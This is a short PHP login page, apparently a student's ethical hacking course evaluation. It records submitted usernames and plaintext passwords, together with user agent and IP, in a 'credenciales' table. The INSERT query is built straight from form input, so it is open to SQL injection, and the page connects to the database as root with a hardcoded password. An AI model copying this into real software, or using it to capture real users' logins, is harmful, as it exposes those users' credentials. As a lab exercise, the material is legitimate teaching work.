<?php
// 1. CONEXIÓN A LA BASE DE DATOS
$conn = new mysqli("localhost", "root", "root", "evaluacion_web");

if ($conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}

$mensaje = "";

// 2. Recibir datos al presionar ¨ENVIAR¨
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario  = $_POST['txtUsuario'];
    $password = $_POST['txtPassword'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $ip_origen  = $_SERVER['REMOTE_ADDR'];

    // Insertar en la tabla credenciales
    $sql = "INSERT INTO credenciales (usuario, password, user_agent, ip_origen) 
            VALUES ('$usuario', '$password', '$user_agent', '$ip_origen')";

    if ($conn->query($sql) === TRUE) {
        $mensaje = "✔ Datos registrados correctamente.";
    } else {
        $mensaje = "❌ Error: " . $conn->error;
        }
    }
$conn->close();
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Evaluación Hacking_Ético Unidad 1 - IRIYC91 Roberto Rodríguez</title>
</head>
<body>
<center>
    <h2>Inicio de Sesión</h2>
    
    <form action="" method="POST">
        <label>Usuario:</label><br>
        <input type="text" name="txtUsuario" required><br><br>
        
        <label>Contraseña:</label><br>
        <input type="password" name="txtPassword" required><br><br>
        
        <input type="submit" value="ENVIAR">
    </form>

    <p><b><?php echo $mensaje; ?></b></p>

    <br>
    <a href="panel.php">Ir al Panel</a>
</center>
</body>
</html>
